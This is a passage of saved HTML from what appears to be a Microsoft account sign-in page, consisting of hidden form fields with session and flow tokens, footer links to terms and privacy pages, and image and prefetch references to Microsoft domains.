value="FF9daQaBXcNqKTj4Mx8FF8EtZfKbmY0FSW3l52j0UK4=9:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRu27TUACG49xoKwRVF5BYKsGESHJsH9-CKuomdknS2HGT1LEZItexk5OL7TjHuT0BY8XYkUggdUQCIWamTJ0RD4AQA-rEBukDsPzTN_z6vqcJMkvmn0AaMhZ3LmQEi6UzUCBBxoIUm6EZmqUpQHYYQId7O7uPHkdvDm--H67Wn-znf9-9uCIe9DAOJvlcbjabZX3XRbaTtf1R7jNBXBPED4K4jKccL9OsX8UnLM0BwFOCwEOaJSkOclmzKAFlqc2VvoEVvTxQCgAoVAme6HLPWIpY6YtAbRwNlZG0UI9LUOl3Z2qxyqi6ho3GYKZu-ColLU4aXagea1hZDoDZUHqGfjZU9SbzLX5fFSPco27HD9HSuYlvu344agf-BF8m3hNq4HilTsH3PMfG2VvM8TCyLYx8rxb6gRNi5EwOim7kzGs1W-NVWaqK03KpDKHJWWaBctqmZ9HIA6eMbQtWya-rJhlOjZmINFeqifz4VKehLAj2qHkMzmyE_HarggL8ki3VXU4o9Dt1jVX0yOhNQVes66gWdaA370bjbqsnRxIXLPQPifRG68j31ol7m1Me6uwHoe-ioXOdJH4m74JEfmtrZzf2MLYf-5Mk3qY2tV5FX595vz5WVqsl3yjHYutUTpaFjqVZRy1bGVcafVid87LMS9h0K-cjA8h1nR4yVB80K_BAyJMXaeIinf6dJl7fiX3Z_l_rfw2"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="2cc4755b-ec6e-4bb5-a3a3-7a38544a0000"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAAP0wLlqdLVToOpA4kwzSnxe4w785jyxIinJi43fnPMKn3fUS4j28QRWMGpZu3kWQ8kmfOwiPeSEBl9EAdQ3Go7QGo56eEZuapV6kHGt-MMPGQEXjay3KQHEcabdTiJuI5rSpkkzssM5nb4ppqd8bdgMDiUwXNPtTdQwUWnoProbw7bBlZBvZYoggLWxnLnUt0ENh-G90tOWFlR57jjCR0zp0K5RFKmFyvt7ynOt5MZFUX-w1p9XHs5ZzVJ2aQkliawRCH-0EtK2Du80QfVbCg7gBj7BlJP2WDh6NyKtJReq1Nor_WLkUFfDyH-Y3w1CJgJc7_ek91JcwoCCfdYiCiw5zM8RlsxH7p18p5zpLvV39gxYXaHnx6ZRxx-fspEj_Jf-BATCWMY261nv-qTBNZbIAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocus to prevent Narrator from losing focus --> <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString(),
        hasFocus: focusMoreInfo() }" aria-label="Click here for troubleshooting information" aria-expanded="false"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="https://www.office.com/prefetch/prefetch" width="0" height="0"></iframe></div> <!-- /ko --></div></body></html>